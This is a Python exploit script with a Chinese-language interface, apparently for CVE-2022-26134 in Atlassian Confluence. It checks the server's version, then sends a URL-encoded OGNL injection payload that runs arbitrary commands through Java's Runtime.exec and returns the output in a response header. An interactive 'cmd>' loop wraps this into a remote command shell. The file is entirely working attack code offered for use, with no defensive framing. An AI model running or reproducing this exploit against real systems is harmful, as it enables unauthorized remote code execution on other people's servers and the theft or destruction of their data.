import requests
import urllib3
import re
from cprint import *

logoInfo = """
  ___  _  _  ____     ___   ___  ___   ___      ___    _   __  ___   __  
 / __)( \/ )( ___)___(__ \ / _ \(__ \ (__ \ ___(__ \  / ) /  )(__ ) /. | 
( (__  \  /  )__)(___)/ _/( (_) )/ _/  / _/(___)/ _/ / _ \ )(  (_ \(_  _)
 \___)  \/  (____)   (____)\___/(____)(____)   (____)\___/(__)(___/  (_) 

"""
cprint.warn(logoInfo)
urllib3.disable_warnings()

headers = {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0 Waterfox/91.8.0"
}


def tips():
    if len(sys.argv) == 2:
        url = sys.argv[1]
        return url
    else:
        cprint.info("使用方式：python3 exp.py https://host")
        exit(1)


def featureCheck(host):
    response_text = requests.get(url=host + "/login.action", headers=headers, verify=False).text
    if "footer-build-information" and "Atlassian Confluence" in response_text:
        try:
            info = "Confluence版本为：" + re.findall("<span id='footer-build-information'>(.*?)</span>", response_text)[0]
            return info
        except IndexError:
            return False
    else:
        return False


def rce(host, cmd):
    payload = "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22" + cmd + "%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
    try:
        response = requests.get(host + payload, headers=headers, verify=False, allow_redirects=False)
        if response.status_code == 302:
            expInfo = response.headers["X-Cmd-Response"]
            return expInfo
        else:
            return False
    except:
        return False


if __name__ == '__main__':
    url = tips()
    feature = featureCheck(url)
    if feature:
        cprint.info(feature)
    else:
        cprint.err("[!] 获取Confluence版本信息失败")
    while True:
        cmdInfo = input("cmd> ")
        if cmdInfo == "exit":
            exit(1)
        cprint.ok(rce(url, cmdInfo))
